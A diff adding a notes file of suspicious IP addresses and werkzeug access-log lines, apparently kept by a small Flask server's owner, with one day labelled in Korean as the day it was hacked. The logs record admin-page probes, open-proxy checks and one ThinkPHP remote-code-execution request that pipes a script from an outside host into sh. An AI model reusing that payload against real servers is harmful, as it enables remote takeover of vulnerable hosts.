@@ -1,0 +1,42 @@
+# long ago
+123.108.202.2
+89.248.168.240
+188.59.201.233
+185.22.206.106
+45.14.224.26
+193.142.146.50
+176.32.34.111
+42.232.235.228
+93.117.4.26
+65.254.24.250
+125.47.251.113
+192.241.217.195
+128.14.136.78
+177.87.217.230
+
+
+# 2021 03 06
+INFO:werkzeug:89.40.73.252 - - [06/Mar/2021 11:46:58] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:94.154.82.17 - - [06/Mar/2021 11:53:04] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:192.241.222.77 - - [06/Mar/2021 12:15:34] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:128.14.136.78 - - [06/Mar/2021 12:34:49] "[37mGET / HTTP/1.1[0m" 200 -
+
+
+# 2021 03 07 - 해킹 당한 날
+INFO:werkzeug:177.87.217.230 - - [07/Mar/2021 10:07:07] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:45.144.177.140 - - [07/Mar/2021 10:38:49] "[37mGET / HTTP/1.0[0m" 200 -
+INFO:werkzeug:193.118.53.202 - - [07/Mar/2021 10:57:45] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:11] "[37mGET /login HTTP/1.0[0m" 200 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:11] "[32mGET /jenkins/login HTTP/1.0[0m" 302 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:11] "[37mGET /manager/html HTTP/1.1[0m" 200 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:11] "[32mGET /wp-login.php HTTP/1.1[0m" 302 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:11] "[37mGET /login HTTP/1.1[0m" 200 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:12] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:13] "[32mGET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://31.42.177.123/ldr.sh|sh HTTP/1.1[0m" 302 -
+INFO:werkzeug:183.3.221.241 - - [07/Mar/2021 11:32:13] "[37mGET /login HTTP/1.1[0m" 200 -
+INFO:werkzeug:123.245.25.64 - - [07/Mar/2021 11:32:13] "[37mHEAD http://110.242.68.4/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:60.13.136.52 - - [07/Mar/2021 11:32:15] "[32mCONNECT www.baidu.com:443 HTTP/1.1[0m" 302 -
+INFO:werkzeug:120.85.110.185 - - [07/Mar/2021 11:32:16] "[37mGET http://www.minghui.org/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:171.37.38.177 - - [07/Mar/2021 11:32:17] "[32mCONNECT cn.bing.com:443 HTTP/1.1[0m" 302 -
+INFO:werkzeug:112.66.108.191 - - [07/Mar/2021 11:32:18] "[32mCONNECT www.so.com:443 HTTP/1.1[0m" 302 -
+INFO:werkzeug:36.106.166.77 - - [07/Mar/2021 11:32:18] "[37mGET http://www.soso.com/ HTTP/1.1[0m" 200 -
